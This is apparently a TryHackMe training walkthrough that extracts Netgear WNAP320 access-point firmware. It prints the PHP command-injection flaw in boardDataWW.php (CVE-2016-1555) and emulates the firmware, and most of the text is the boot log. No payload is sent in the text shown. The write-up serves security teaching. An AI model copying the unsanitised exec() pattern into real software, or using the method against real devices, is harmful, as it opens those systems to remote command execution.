---
layout: single
title: TryHackMe - Intro to IoT Pentesting
excerpt: "A beginner friendly walkthrough for internet of things (IoT) pentesting "
date: 2020-08-07
classes: wide
header:
  teaser_home_page: true
categories:
  - iot
  - thm
permalink: /thm/IoT
tags: [ iot,thm, netgear, CVE-2016-1555]

---

A beginner friendly walkthrough for internet of things (IoT) pentesting 

## A little theory
 
### What is firmware?

A firmware is a small piece of software that makes hardware work and do what its manufacturer intended it to do. Without it the devices we use wouldn't work.

### How to obtain it?

These are the main ways of obtaining the firmware:

1.  Obtaining it from the vendor's website
2.  Googling it  
3.  Reversing the mobile application
4.  Sniffing the OTA (over the air) update mechanism
5.  Dumping it from the device

### Where was this firmware used?

The firmware we are about to analyze was used by Netgear for a few of their AP (access point) products.  Besides that, the vulnerability affected multiple firmwares. You can take a look at them here: [CVE-2016-1555](https://www.cvedetails.com/cve/CVE-2016-1555/).

## Unpacking the firmware

The firmware we are going to use is from NetGear and was used for Access Points (now it's been superceded by another version). In case you want to download it locally on your machine this is the download link: [http://www.downloads.netgear.com/files/GDC/WNAP320/WNAP320%20Firmware%20Version%202.0.3.zip](http://www.downloads.netgear.com/files/GDC/WNAP320/WNAP320%20Firmware%20Version%202.0.3.zip)  

If you access the Desktop folder, you should see the firmware zip archive. Let's unzip the archive.

 ```bash   
iot@iot:~/Desktop$ ls
firmware-analysis-toolkit  WNAP320 Firmware Version 2.0.3.zip
iot@iot:~/Desktop$ unzip WNAP320\ Firmware\ Version\ 2.0.3.zip 
Archive:  WNAP320 Firmware Version 2.0.3.zip
  inflating: ReleaseNotes_WNAP320_fw_2.0.3.HTML  
  inflating: WNAP320_V2.0.3_firmware.tar  
iot@iot:~/Desktop$ tar -xf WNAP320_V2.0.3_firmware.tar 
iot@iot:~/Desktop$ ls
firmware-analysis-toolkit           root_fs.md5        WNAP320 Firmware Version 2.0.3.zip
kernel.md5                          rootfs.squashfs    WNAP320_V2.0.3_firmware.tar
ReleaseNotes_WNAP320_fw_2.0.3.HTML  vmlinux.gz.uImage
   ```
 
 The file that interests us the most is "**rootfs.squashfs**". Let's use binwalk to extract the filesystem as follows:

```bash
iot@iot:~/Desktop$ binwalk -e rootfs.squashfs 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Squashfs filesystem, big endian, lzma signature, version 3.1, size: 4433988 bytes, 1247 inodes, blocksize: 65536 bytes, created: 2011-06-23 10:46:19

iot@iot:~/Desktop$ ls
firmware-analysis-toolkit           root_fs.md5                 vmlinux.gz.uImage
kernel.md5                          rootfs.squashfs             WNAP320 Firmware Version 2.0.3.zip
ReleaseNotes_WNAP320_fw_2.0.3.HTML  _rootfs.squashfs.extracted  WNAP320_V2.0.3_firmware.tar
```

As you can see, it dropped another folder named "**_rootfs.squashfs.extracted**".

Take a look inside the folder.

What it looks like?

It looks like linux filesystems.

If you go into /home/www you'll find the web application that is used.

```bash
iot@iot:~/Desktop$ cd _rootfs.squashfs.extracted/

iot@iot:~/Desktop/_rootfs.squashfs.extracted$ ls
0.squashfs  squashfs-root

iot@iot:~/Desktop/_rootfs.squashfs.extracted$ cd squashfs-root/

iot@iot:~/Desktop/_rootfs.squashfs.extracted/squashfs-root$ ls
bin  dev  etc  home  lib  linuxrc  proc  root  sbin  tmp  usr  var

iot@iot:~/Desktop/_rootfs.squashfs.extracted/squashfs-root$ cd home/www && ls
background.html   common.php          include            packetCapture.php  thirdMenu.html
BackupConfig.php  config.php          index.php          recreate.php       thirdMenu.php
boardDataNA.php   data.php            killall.php        redirect.html      titleLogo.php
boardDataWW.php   downloadFile.php    login_button.html  redirect.php       tmpl
body.php          getBoardConfig.php  login_header.php   saveTable.php      UserGuide.html
button.html       getJsonData.php     login.php          siteSurvey.php
checkConfig.php   header.php          logout.html        support.link
checkSession.php  help                logout.php         templates
clearLog.php      images              monitorFile.cfg    test.php
```

## Attacking the application

The next step would be analyzing each php file to try to find a vulnerability. I'll save you that time, and we'll take a look at "**boardDataWW.php**". This file contains a Command Execution vulnerability. The piece of code that we are interested is this:

```php
<?php
	$flag=false;
	$msg='';
	if (!empty($_REQUEST['writeData'])) {
		if (!empty($_REQUEST['macAddress']) && array_search($_REQUEST['reginfo'],Array('WW'=>'0','NA'=>'1'))!==false && ereg("[0-9a-fA-F]{12,12}",$_REQUEST['macAddress'],$regs)!==false) {
			//echo "test ".$_REQUEST['macAddress']." ".$_REQUEST['reginfo'];
			//exec("wr_mfg_data ".$_REQUEST['macAddress']." ".$_REQUEST['reginfo'],$dummy,$res);
			exec("wr_mfg_data -m ".$_REQUEST['macAddress']." -c ".$_REQUEST['reginfo'],$dummy,$res);
			if ($res==0) {
				conf_set_buffer("system:basicSettings:apName netgear".substr($_REQUEST['macAddress'], -6)."\n");
				conf_save();
				$msg = 'Update Success!';
				$flag = true;
			}
		}
		else
			$flag = true;
	}
?>
```

The vulnerable function is the **exec()** one. The exec() function executes an external program without displaying the information (basically it's a blind command execution).

Time to emulate the system. For this task we'll use FAT(firmware analysis toolkit). FAT is based on [Firmadyne](https://github.com/firmadyne/firmadyne) (FIRMADYNE is an automated and scalable system for performing emulation and dynamic analysis of Linux-based embedded firmware) with some changes. Firmadyne uses a PostgreSQL database to store information about the emulated images. However for the core functionality PostgreSQL is not really needed. Hence FAT doesn't use it.

Elevate your shell and copy rootfs.squashfs to firmware-analysis-toolkit folder and change the owner of the file to root.

```bash
iot@iot:~/Desktop$ sudo -s
[sudo] password for iot: 

root@iot:~/Desktop# cp rootfs.squashfs firmware-analysis-toolkit/ ; cd firmware-analysis-toolkit/ ; chown root:root rootfs.squashfs ; ll
total 4388
drwxr-xr-x  6 root root    4096 aug  7 06:20 ./
drwxr-xr-x  4 iot  iot     4096 aug  7 06:04 ../
drwxr-xr-x  7 root root    4096 iun 16 13:51 binwalk/
-rw-r--r--  1 root root     107 iun 16 13:52 fat.config
-rwxr-xr-x  1 root root    5639 iun 16 13:50 fat.py*
drwxr-xr-x 11 root root    4096 iun 16 13:53 firmadyne/
drwxr-xr-x  8 root root    4096 iun 16 13:50 .git/
-rw-r--r--  1 root root    1069 iun 16 13:50 LICENSE
drwxr-xr-x  3 root root    4096 iun 16 13:52 qemu-builds/
-rw-r--r--  1 root root    5428 iun 16 13:50 README.md
-rwxr-xr-x  1 root root     734 iun 16 13:50 reset.py*
-rwx------  1 root root 4435968 aug  7 06:20 rootfs.squashfs*
-rwxr-xr-x  1 root root    1673 iun 16 13:50 setup.sh*
```
Now, let's kick off fat (firmware analysis toolkit) and emulate the system.

```bash
root@iot:~/Desktop/firmware-analysis-toolkit# ./fat.py rootfs.squashfs 

                               __           _
                              / _|         | |
                             | |_    __ _  | |_
                             |  _|  / _` | | __|
                             | |   | (_| | | |_
                             |_|    \__,_|  \__|

                Welcome to the Firmware Analysis Toolkit - v0.3
    Offensive IoT Exploitation Training http://bit.do/offensiveiotexploitation
                  By Attify - https://attify.com  | @attifyme
    
[+] Firmware: rootfs.squashfs
[+] Extracting the firmware...
[+] Image ID: 1
[+] Identifying architecture...
[+] Architecture: mipseb
[+] Building QEMU disk image...
[+] Setting up the network connection, please standby...
[+] Network interfaces: [('brtrunk', '192.168.0.100')]
[+] All set! Press ENTER to run the firmware...
[+] When running, press Ctrl + A X to terminate qemu
[+] Command line: /home/iot/Desktop/firmware-analysis-toolkit/firmadyne/scratch/1/run.sh
Creating TAP device tap2_0...
Starting firmware emulation... use Ctrl-a + x to exit
tryhackme123!
[    0.000000] Linux version 2.6.32.70 (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) #1 Thu Feb 18 01:39:21 UTC 2016
[    0.000000] 
[    0.000000] LINUX started...
[    0.000000] bootconsole [early0] enabled
[    0.000000] CPU revision is: 00019300 (MIPS 24Kc)
[    0.000000] FPU revision is: 00739300
[    0.000000] Determined physical RAM map:
[    0.000000]  memory: 00001000 @ 00000000 (reserved)
[    0.000000]  memory: 000ef000 @ 00001000 (ROM data)
[    0.000000]  memory: 0061e000 @ 000f0000 (reserved)
[    0.000000]  memory: 0f8f1000 @ 0070e000 (usable)
[    0.000000] debug: ignoring loglevel setting.
[    0.000000] Wasting 57792 bytes for tracking 1806 unused pages
[    0.000000] Initrd not found or empty - disabling initrd
[    0.000000] Zone PFN ranges:
[    0.000000]   DMA      0x00000000 -> 0x00001000
[    0.000000]   Normal   0x00001000 -> 0x0000ffff
[    0.000000] Movable zone start PFN for each node
[    0.000000] early_node_map[1] active PFN ranges
[    0.000000]     0: 0x00000000 -> 0x0000ffff
[    0.000000] On node 0 totalpages: 65535
[    0.000000] free_area_init_node: node 0, pgdat 806aa3c0, node_mem_map 81000000
[    0.000000]   DMA zone: 32 pages used for memmap
[    0.000000]   DMA zone: 0 pages reserved
[    0.000000]   DMA zone: 4064 pages, LIFO batch:0
[    0.000000]   Normal zone: 480 pages used for memmap
[    0.000000]   Normal zone: 60959 pages, LIFO batch:15
[    0.000000] Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 65023
[    0.000000] Kernel command line: root=/dev/sda1 console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 user_debug=31 firmadyne.syscall=0
[    0.000000] PID hash table entries: 1024 (order: 0, 4096 bytes)
[    0.000000] Dentry cache hash table entries: 32768 (order: 5, 131072 bytes)
[    0.000000] Inode-cache hash table entries: 16384 (order: 4, 65536 bytes)
[    0.000000] Primary instruction cache 2kB, VIPT, 2-way, linesize 16 bytes.
[    0.000000] Primary data cache 2kB, 2-way, VIPT, no aliases, linesize 16 bytes
[    0.000000] Writing ErrCtl register=00000000
[    0.000000] Readback ErrCtl register=00000000
[    0.000000] Memory: 252428k/254916k available (4260k kernel code, 2252k reserved, 1549k data, 220k init, 0k highmem)
[    0.000000] Hierarchical RCU implementation.
[    0.000000] NR_IRQS:256
[    0.000000] CPU frequency 200.00 MHz
[    0.000000] Console: colour dummy device 80x25
[    0.004000] Calibrating delay loop... 890.88 BogoMIPS (lpj=1781760)
[    0.092000] Mount-cache hash table entries: 512
[    0.104000] NET: Registered protocol family 16
[    0.116000] bio: create slab <bio-0> at 0
[    0.120000] vgaarb: loaded
[    0.120000] SCSI subsystem initialized
[    0.124000] libata version 3.00 loaded.
[    0.124000] usbcore: registered new interface driver usbfs
[    0.128000] usbcore: registered new interface driver hub
[    0.132000] usbcore: registered new device driver usb
[    0.136000] pci 0000:00:00.0: reg 14 32bit mmio pref: [0x1000000-0x1ffffff]
[    0.140000] pci 0000:00:0a.1: reg 20 io port: [0x00-0x0f]
[    0.144000] pci 0000:00:0a.2: reg 20 io port: [0x00-0x1f]
[    0.148000] pci 0000:00:0a.3: BAR 8: address space collision on of bridge [0x1100-0x110f]
[    0.152000] pci 0000:00:0a.3: quirk: region 1100-110f claimed by PIIX4 SMB
[    0.156000] pci 0000:00:12.0: reg 10 32bit mmio pref: [0x000000-0x1ffffff]
[    0.160000] pci 0000:00:12.0: reg 14 32bit mmio: [0x000000-0x000fff]
[    0.164000] pci 0000:00:12.0: reg 30 32bit mmio pref: [0x000000-0x00ffff]
[    0.164000] pci 0000:00:13.0: reg 10 32bit mmio: [0x000000-0x01ffff]
[    0.168000] pci 0000:00:13.0: reg 14 io port: [0x00-0x3f]
[    0.168000] pci 0000:00:13.0: reg 30 32bit mmio pref: [0x000000-0x03ffff]
[    0.172000] pci 0000:00:14.0: reg 10 32bit mmio: [0x000000-0x01ffff]
[    0.172000] pci 0000:00:14.0: reg 14 io port: [0x00-0x3f]
[    0.176000] pci 0000:00:14.0: reg 30 32bit mmio pref: [0x000000-0x03ffff]
[    0.176000] pci 0000:00:15.0: reg 10 32bit mmio: [0x000000-0x01ffff]
[    0.180000] pci 0000:00:15.0: reg 14 io port: [0x00-0x3f]
[    0.180000] pci 0000:00:15.0: reg 30 32bit mmio pref: [0x000000-0x03ffff]
[    0.184000] vgaarb: device added: PCI:0000:00:12.0,decodes=io+mem,owns=none,locks=none
[    0.188000] pci 0000:00:0a.3: BAR 8: bogus alignment [0x1100-0x110f] flags 0x100
[    0.192000] cfg80211: Calling CRDA to update world regulatory domain
[    0.196000] Switching to clocksource MIPS
[    0.200000] Switched to NOHz mode on CPU #0
[    0.200000] NET: Registered protocol family 2
[    0.200000] IP route cache hash table entries: 2048 (order: 1, 8192 bytes)
[    0.208000] TCP established hash table entries: 8192 (order: 4, 65536 bytes)
[    0.212000] TCP bind hash table entries: 8192 (order: 3, 32768 bytes)
[    0.216000] TCP: Hash tables configured (established 8192 bind 8192)
[    0.220000] TCP reno registered
[    0.224000] NET: Registered protocol family 1
[    0.224000] PCI: Enabling device 0000:00:0a.2 (0000 -> 0001)
[    0.252000] squashfs: version 4.0 (2009/01/31) Phillip Lougher
[    0.256000] Registering unionfs 2.6 (for 2.6.32.63)
[    0.256000] JFFS2 version 2.2. (NAND) Â© 2001-2006 Red Hat, Inc.
[    0.264000] ROMFS MTD (C) 2007 Red Hat, Inc.
[    0.264000] msgmni has been set to 493
[    0.280000] alg: No test for stdrng (krng)
[    0.312000] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 253)
[    0.320000] io scheduler noop registered
[    0.320000] io scheduler cfq registered (default)
[    0.324000] firmadyne: devfs: 1, execute: 1, procfs: 1, syscall: 0
[    0.332000] firmadyne: Cannot register character device: watchdog, 0xa, 0x82!
[    0.336000] firmadyne: Cannot register character device: wdt, 0xfd, 0x0!
[    0.384000] PCI: Enabling device 0000:00:12.0 (0000 -> 0002)
[    0.392000] cirrusfb 0000:00:12.0: Cirrus Logic chipset on PCI bus, RAM (4096 kB) at 0x10000000
[    0.620000] Console: switching to colour frame buffer device 80x30
[    0.648000] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.652000] serial8250.0: ttyS0 at I/O 0x3f8 (irq = 4) is a 16550A
[    0.660000] console [ttyS0] enabled, bootconsole disabled
[    0.660000] console [ttyS0] enabled, bootconsole disabled
[    0.664000] serial8250.0: ttyS1 at I/O 0x2f8 (irq = 3) is a 16550A
[    0.672000] brd: module loaded
[    0.676000] loop: module loaded
[    0.680000] ata_piix 0000:00:0a.1: version 2.13
[    0.684000] PCI: Enabling device 0000:00:0a.1 (0000 -> 0001)
[    0.692000] PCI: Setting latency timer of device 0000:00:0a.1 to 64
[    0.700000] scsi0 : ata_piix
[    0.700000] scsi1 : ata_piix
[    0.704000] ata1: PATA max UDMA/33 cmd 0x1f0 ctl 0x3f6 bmdma 0x10e0 irq 14
[    0.708000] ata2: PATA max UDMA/33 cmd 0x170 ctl 0x376 bmdma 0x10e8 irq 15
[    0.720000] NAND device: Manufacturer ID: 0x98, Chip ID: 0x39 (Toshiba NAND 128MiB 1,8V 8-bit)
[    0.724000] flash size: 128 MiB
[    0.728000] page size: 512 bytes
[    0.728000] OOB area size: 16 bytes
[    0.732000] sector size: 16 KiB
[    0.732000] pages number: 262144
[    0.736000] pages per sector: 32
[    0.740000] bus width: 8
[    0.740000] bits in sector size: 14
[    0.744000] bits in page size: 9
[    0.744000] bits in OOB size: 4
[    0.748000] flash size with OOB: 135168 KiB
[    0.748000] page address bytes: 4
[    0.752000] sector address bytes: 3
[    0.756000] options: 0x62
[    0.760000] Scanning device for bad blocks
[    0.832000] Creating 11 MTD partitions on "NAND 128MiB 1,8V 8-bit":
[    0.836000] 0x000000000000-0x000000100000 : "NAND simulator partition 0"
[    0.840000] 0x000000100000-0x000000200000 : "NAND simulator partition 1"
[    0.848000] 0x000000200000-0x000000300000 : "NAND simulator partition 2"
[    0.852000] 0x000000300000-0x000000400000 : "NAND simulator partition 3"
[    0.856000] 0x000000400000-0x000000500000 : "NAND simulator partition 4"
[    0.860000] 0x000000500000-0x000000600000 : "NAND simulator partition 5"
[    0.864000] 0x000000600000-0x000000700000 : "NAND simulator partition 6"
[    0.872000] 0x000000700000-0x000000800000 : "NAND simulator partition 7"
[    0.876000] 0x000000800000-0x000000900000 : "NAND simulator partition 8"
[    0.880000] 0x000000900000-0x000000a00000 : "NAND simulator partition 9"
[    0.884000] 0x000000a00000-0x000008000000 : "NAND simulator partition 10"
[    0.892000] Intel(R) PRO/1000 Network Driver - version 7.3.21-k5-NAPI
[    0.896000] Copyright (c) 1999-2006 Intel Corporation.
[    0.896000] PCI: Enabling device 0000:00:13.0 (0000 -> 0003)
[    0.904000] PCI: Setting latency timer of device 0000:00:13.0 to 64
[    0.908000] ata1.01: NODEV after polling detection
[    0.912000] ata2.01: NODEV after polling detection
[    0.916000] ata1.00: ATA-7: QEMU HARDDISK, 2.5+, max UDMA/100
[    0.920000] ata1.00: 2097152 sectors, multi 16: LBA48 
[    0.924000] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.928000] ata2.00: configured for UDMA/33
[    0.932000] ata1.00: configured for UDMA/33
[    0.940000] scsi 0:0:0:0: Direct-Access     ATA      QEMU HARDDISK    2.5+ PQ: 0 ANSI: 5
[    0.948000] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.956000] sd 0:0:0:0: [sda] 2097152 512-byte logical blocks: (1.07 GB/1.00 GiB)
[    0.960000] sd 0:0:0:0: [sda] Write Protect is off
[    0.964000] sd 0:0:0:0: [sda] Mode Sense: 00 3a 00 00
[    0.968000] sd 0:0:0:0: [sda] Write cache: enabled, read cache: enabled, doesn't support DPO or FUA
[    0.972000]  sda: sda1
[    0.980000] sd 0:0:0:0: [sda] Attached SCSI disk
[    1.216000] e1000: 0000:00:13.0: e1000_probe: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.260000] e1000: eth0: e1000_probe: Intel(R) PRO/1000 Network Connection
[    1.264000] PCI: Enabling device 0000:00:14.0 (0000 -> 0003)
[    1.272000] PCI: Setting latency timer of device 0000:00:14.0 to 64
[    1.524000] e1000: 0000:00:14.0: e1000_probe: (PCI:33MHz:32-bit) 52:54:00:12:34:57
[    1.564000] e1000: eth1: e1000_probe: Intel(R) PRO/1000 Network Connection
[    1.568000] PCI: Enabling device 0000:00:15.0 (0000 -> 0003)
[    1.576000] PCI: Setting latency timer of device 0000:00:15.0 to 64
[    1.824000] e1000: 0000:00:15.0: e1000_probe: (PCI:33MHz:32-bit) 52:54:00:12:34:58
[    1.864000] e1000: eth2: e1000_probe: Intel(R) PRO/1000 Network Connection
[    1.868000] e1000e: Intel(R) PRO/1000 Network Driver - 1.0.2-k2
[    1.872000] e1000e: Copyright (c) 1999-2008 Intel Corporation.
[    1.876000] pcnet32.c:v1.35 21.Apr.2008 tsbogend@alpha.franken.de
[    1.884000] PPP generic driver version 2.4.2
[    1.888000] PPP Deflate Compression module registered
[    1.896000] PPP MPPE Compression module registered
[    1.896000] NET: Registered protocol family 24
[    1.896000] PPPoL2TP kernel driver, V1.0
[    1.896000] tun: Universal TUN/TAP device driver, 1.6
[    1.900000] tun: (C) 1999-2004 Max Krasnyansky <maxk@qualcomm.com>
[    1.904000] ehci_hcd: USB 2.0 'Enhanced' Host Controller (EHCI) Driver
[    1.912000] ohci_hcd: USB 1.1 'Open' Host Controller (OHCI) Driver
[    1.916000] uhci_hcd: USB Universal Host Controller Interface driver
[    1.920000] PCI: Setting latency timer of device 0000:00:0a.2 to 64
[    1.928000] uhci_hcd 0000:00:0a.2: UHCI Host Controller
[    1.932000] uhci_hcd 0000:00:0a.2: new USB bus registered, assigned bus number 1
[    1.936000] uhci_hcd 0000:00:0a.2: irq 11, io base 0x000010c0
[    1.944000] usb usb1: configuration #1 chosen from 1 choice
[    1.948000] hub 1-0:1.0: USB hub found
[    1.952000] hub 1-0:1.0: 2 ports detected
[    1.956000] Initializing USB Mass Storage driver...
[    1.960000] usbcore: registered new interface driver usb-storage
[    1.968000] USB Mass Storage support registered.
[    1.972000] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.976000] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.980000] mice: PS/2 mouse device common for all mice
[    1.988000] rtc_cmos rtc_cmos: rtc core: registered rtc_cmos as rtc0
[    1.992000] rtc0: alarms up to one day, 242 bytes nvram
[    1.996000] i2c /dev entries driver
[    1.996000] piix4_smbus 0000:00:0a.3: SMBus Host Controller at 0x1100, revision 0
[    2.004000] sdhci: Secure Digital Host Controller Interface driver
[    2.008000] sdhci: Copyright(c) Pierre Ossman
[    2.016000] usbcore: registered new interface driver hiddev
[    2.020000] usbcore: registered new interface driver usbhid
[    2.024000] usbhid: v2.6:USB HID core driver
[    2.024000] Netfilter messages via NETLINK v0.30.
[    2.028000] nf_conntrack version 0.5.0 (3947 buckets, 15788 max)
[    2.032000] ctnetlink v0.93: registering with nfnetlink.
[    2.040000] IPv4 over IPv4 tunneling driver
[    2.040000] GRE over IPv4 tunneling driver
[    2.044000] ip_tables: (C) 2000-2006 Netfilter Core Team
[    2.052000] arp_tables: (C) 2002 David S. Miller
[    2.056000] TCP cubic registered
[    2.056000] Initializing XFRM netlink socket
[    2.060000] NET: Registered protocol family 10
[    2.068000] ip6_tables: (C) 2000-2006 Netfilter Core Team
[    2.072000] IPv6 over IPv4 tunneling driver
[    2.076000] NET: Registered protocol family 17
[    2.076000] Bridge firewalling registered
[    2.080000] Ebtables v2.0 registered
[    2.084000] 802.1Q VLAN Support v1.8 Ben Greear <greearb@candelatech.com>
[    2.088000] All bugs added by David S. Miller <davem@redhat.com>
[    2.092000] lib80211: common routines for IEEE802.11 drivers
[    2.096000] lib80211_crypt: registered algorithm 'NULL'
[    2.100000] rtc_cmos rtc_cmos: setting system clock to 2020-08-07 04:53:34 UTC (1596776014)
[    2.108000] input: AT Raw Set 2 keyboard as /devices/platform/i8042/serio0/input/input0
[    2.316000] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input1
[    2.332000] EXT2-fs warning: mounting unchecked fs, running e2fsck is recommended
[    2.336000] VFS: Mounted root (ext2 filesystem) on device 8:1.
[    2.344000] Freeing prom memory: 956k freed
[    2.360000] Freeing unused kernel memory: 220k freed
hackme123!
[    2.400000] firmadyne: sys_reboot[PID: 45 (init)]: magic1:fee1dead, magic2:28121969, cmd:0
[    2.432000] firmadyne: do_execve: /firmadyne/console
[    2.436000] OFFSETS: offset of pid: 0x100 offset of comm: 0x1f0

Mounting etc to ramfs.      [DONE]

Mounting var to jffs2.      [FAILED]

Checking SSH keys.          [DONE]

Checking for run file.      [DONE]

Starting System Logger.     [DONE]

Starting Kernel Logger.     [DONE]
[    5.840000] klogd/102: potentially unexpected fatal signal 10.
[    5.844000] 
[    5.844000] Cpu 0
[    5.848000] $ 0   : 00000000 00000001 00000008 ffffffff
[    5.852000] $ 4   : 00000000 00000000 00000000 7feea690
[    5.856000] $ 8   : 00000000 00000000 00000000 7feea4b8
[    5.860000] $12   : 2ab3c868 2ab4f004 92492493 00000043
[    5.864000] $16   : 7feea5f8 ffffffff 7feead08 7feead08
[    5.872000] $20   : 7feeacab 2ab4fc40 7feea6f0 00000000
[    5.876000] $24   : 00000000 2ab25bc0                  
[    5.880000] $28   : 2ab57440 7feea508 ffffffff 2ab225c8
[    5.884000] Hi    : 00000001
[    5.888000] Lo    : 00000000
[    5.888000] epc   : 2ab22648 0x2ab22648
[    5.892000]     Not tainted
[    5.892000] ra    : 2ab225c8 0x2ab225c8
[    5.896000] Status: 0000a413    USER EXL IE 
[    5.900000] Cause : 10800010
[    5.900000] BadVA : ffffffff
[    5.904000] PrId  : 00019300 (MIPS 24Kc)

Starting Panel LED.         [DONE]

Starting watchdog.          [DONE]
Error in opening the device.
: No such device
Error in opening the device
: No such device

Starting Reset Detect.      [DONE]
WN802T_SYS_RESET_DETECT_IOC returned err 

Checking Manufac. data      [DEFAULT]
Erase Total 1 Units
Performing Flash Erase of length 16384 at offset 0x0 done
[    7.980000] nand_do_write_ops: Attempt to write not page aligned data
Error Writing device /dev/mtd5.

Checking board file.        [CREATED]

Loading Ethernet module.    [GENMAC]

                            BusyBox v1.11.0 (2011-06-23 15:54:48 IST) multi-call binary

Usage: ifconfig [-a] interface [address]

Configure a network interface

Options:
	[[-]broadcast [ADDRESS]] [[-]pointopoint [ADDRESS]]
	[netmask ADDRESS] [dstaddr ADDRESS]
	[outfill NN] [keepalive NN]
	[hw ether|infiniband ADDRESS] [metric NN] [mtu NN]
	[[-]trailers] [[-]arp] [[-]allmulti]
	[multicast] [[-]promisc] [txqueuelen NN] [[-]dynamic]
	[mem_start NN] [io_addr NN] [irq NN]
	[up|down] ...

[DONE]

Checking database.          [COPYING DEFAULT]

                            root: Restoring configuration from file /etc/default-config.
root: Generating AP name.
root: Restore config is successfull.
[DONE]

Verifing checksum.          [DONE]

Loading Bridge module.      [DONE]
/etc/init.d/rcS: /etc/init.d/S020bridge.sh: line 39: cannot create /proc/sys/net/bridge/bridge-nf-enabled: nonexistent directory

Loading wlan modules.       [DONE]

Creating vap interface.     /usr/local/bin/wlanconfig: ioctl: No such device
ifconfig: SIOCSIFTXQLEN: No such device
/usr/local/bin/wlanconfig: ioctl: No such device
ifconfig: SIOCSIFTXQLEN: No such device
/usr/local/bin/wlanconfig: ioctl: No such device
ifconfig: SIOCSIFTXQLEN: No such device
/usr/local/bin/wlanconfig: ioctl: No such device
ifconfig: SIOCSIFTXQLEN: No such device
/usr/local/bin/wlanconfig: ioctl: No such device
ifconfig: SIOCSIFTXQLEN: No such device
/usr/local/bin/wlanconfig: ioctl: No such device
ifconfig: SIOCSIFTXQLEN: No such device
/usr/local/bin/wlanconfig: ioctl: No such device
ifconfig: SIOCSIFTXQLEN: No such device
/usr/local/bin/wlanconfig: ioctl: No such device
ifconfig: SIOCSIFTXQLEN: No such device
[DONE]

Creating wds interface.     /usr/local/bin/wlanconfig: ioctl: No such device
ifconfig: SIOCSIFMTU: No such device
/usr/local/bin/wlanconfig: ioctl: No such device
ifconfig: SIOCSIFMTU: No such device
/usr/local/bin/wlanconfig: ioctl: No such device
ifconfig: SIOCSIFMTU: No such device
/usr/local/bin/wlanconfig: ioctl: No such device
ifconfig: SIOCSIFMTU: No such device
[DONE]

Starting configd.           [DONE]

Starting web server.        [DONE]

Starting Translator...      start-stop-daemon: cannot start /usr/bin/log_ro: No such file or directory
[syslog]

Starting Translator...      [password]

Starting Translator...      [ssh]

Starting Translator...      [snmp]

Starting Translator...      [telnet]

Starting Translator...      [dns]

Starting Translator...      [   19.536000] device eth0 entered promiscuous mode
[   19.560000] e1000: eth0 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: RX
[   19.564000] ADDRCONF(NETDEV_UP): eth0: link is not ready
[   19.572000] brtrunk: port 1(eth0) entering learning state
[   19.576000] ADDRCONF(NETDEV_CHANGE): eth0: link becomes ready
set cascaded bridge failed: Operation not supported
route: SIOCADDRT: Invalid argument
[bridge_and_vlan_translator]

Starting Translator...      [   19.876000] do_page_fault() #2: sending SIGSEGV to hostapd_tr for invalid read access from
[   19.876000] 00000004 (epc == 2aafc7d0, ra == 00416804)
[   19.884000] Cpu 0
[   19.884000] $ 0   : 00000000 00000001 00000004 00000000
[   19.888000] $ 4   : 00000004 00419f18 00000000 00000001
[   19.892000] $ 8   : 2ab25004 0042e0b8 00000031 fffffff0
[   19.896000] $12   : 8fbf1eb0 00000234 06ca3695 2aad9578
[   19.904000] $16   : 7fec03e0 7fec0270 7fadae14 ffffffff
[   19.908000] $20   : 7fec0334 00401834 00000001 004019f0
[   19.912000] $24   : 00000002 2aafc7d0                  
[   19.916000] $28   : 00435880 7febfcc8 7febfcc8 00416804
[   19.920000] Hi    : 00000005
[   19.924000] Lo    : 19999999
[   19.924000] epc   : 2aafc7d0 0x2aafc7d0
[   19.928000]     Not tainted
[   19.928000] ra    : 00416804 0x416804
[   19.932000] Status: 0000a413    USER EXL IE 
[   19.936000] Cause : 10800008
[   19.936000] BadVA : 00000004
[   19.936000] PrId  : 00019300 (MIPS 24Kc)
[   19.940000] Modules linked in:
[   19.940000] Process hostapd_tr (pid: 559, threadinfo=8fbf0000, task=8f966038, tls=00000000)
[   19.948000] Stack : 696e6773 3a646863 7073536e 64446e73 00435880 2e302e30 00000000 74656d3a
[   19.952000]         64686370 73536574 7febfcf8 00402404 00419f18 0041a030 6e732030 2e302e30
[   19.956000]         00435880 79737465 2f746d70 2f686f73 74617064 2e636f6e 662e7769 6669302e
[   19.964000]         74656d70 00302e30 2e302e30 0a737973 74656d3a 64686370 73536574 74696e67
[   19.968000]         733a6468 6370734c 65617365 54696d65 20383634 30300a0a 73797374 656d3a6c
[   19.972000]         ...
[   19.976000] Call Trace:
[   19.976000] 
[   19.980000] 
[   19.980000] Code: 00000000  00000000  00000000 <90830000> 90a20000  24840001  14600003  24a50001  03e00008 
[   19.984000] hostapd_tr/559: potentially unexpected fatal signal 11.
[   19.988000] 
[   19.988000] Cpu 0
[   19.992000] $ 0   : 00000000 00000001 00000004 00000000
[   19.992000] $ 4   : 00000004 00419f18 00000000 00000001
[   19.996000] $ 8   : 2ab25004 0042e0b8 00000031 fffffff0
[   20.000000] $12   : 8fbf1eb0 00000234 06ca3695 2aad9578
[   20.004000] $16   : 7fec03e0 7fec0270 7fadae14 ffffffff
[   20.004000] $20   : 7fec0334 00401834 00000001 004019f0
[   20.008000] $24   : 00000002 2aafc7d0                  
[   20.012000] $28   : 00435880 7febfcc8 7febfcc8 00416804
[   20.016000] Hi    : 00000005
[   20.016000] Lo    : 19999999
[   20.016000] epc   : 2aafc7d0 0x2aafc7d0
[   20.020000]     Not tainted
[   20.020000] ra    : 00416804 0x416804
[   20.024000] Status: 0000a413    USER EXL IE 
[   20.024000] Cause : 10800008
[   20.028000] BadVA : 00000004
[   20.028000] PrId  : 00019300 (MIPS 24Kc)
Segmentation fault
